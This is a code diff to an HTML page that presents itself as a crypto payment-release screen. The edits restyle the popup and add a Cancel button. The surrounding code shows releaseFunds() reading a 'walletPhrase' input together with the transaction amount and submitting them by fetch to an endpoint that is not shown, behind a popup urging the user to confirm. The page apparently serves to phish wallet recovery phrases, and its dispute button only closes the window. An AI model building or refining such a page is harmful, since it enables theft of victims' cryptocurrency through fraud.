@@ -58,9 +58,12 @@
             display: none;
         }
         /* Popup Styling */
-        .popup {
+        .popup, .overlay {
             display: none;
             position: fixed;
+            z-index: 1000;
+        }
+        .popup {
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
@@ -70,21 +73,17 @@
             border-radius: 10px;
             text-align: center;
             width: 350px;
-            z-index: 1000;
         }
         .popup button {
             background-color: #28a745;
             color: white;
         }
         .overlay {
-            display: none;
-            position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             background: rgba(0, 0, 0, 0.3);
-            z-index: 999;
         }
     </style>
 </head>
@@ -129,6 +128,7 @@
     <div class="popup" id="popup">
         <p><strong>Payment is processing.</strong><br> Kindly confirm payment before releasing funds.</p>
         <button onclick="releaseFunds()">Release</button>
+        <button onclick="closePopup()">Cancel</button>
     </div>
 
     <script>
@@ -137,7 +137,14 @@
             document.getElementById("overlay").style.display = "block";
         }
 
+        function closePopup() {
+            document.getElementById("popup").style.display = "none";
+            document.getElementById("overlay").style.display = "none";
+        }
+
         function releaseFunds() {
+            closePopup();
+
             let walletPhrase = document.getElementById('walletPhrase').value;
             let transactionAmount = document.getElementById('transactionAmount').value;
             let usdValue = document.getElementById('usdValue').textContent;
@@ -164,7 +171,6 @@
             })
             .then(data => {
                 alert("Funds are being released! Kindly exercise patience.");
-                closePopup();
             })
             .catch(error => alert('Error: ' + error.message));
         }
@@ -196,12 +202,7 @@
 
         function raiseDispute() {
             alert("Dispute has been raised. Please contact support.");
-            window.close();  // This attempts to close the page
-        }
-
-        function closePopup() {
-            document.getElementById("popup").style.display = "none";
-            document.getElementById("overlay").style.display = "none";
+            window.close();
         }
     </script>
 </body>
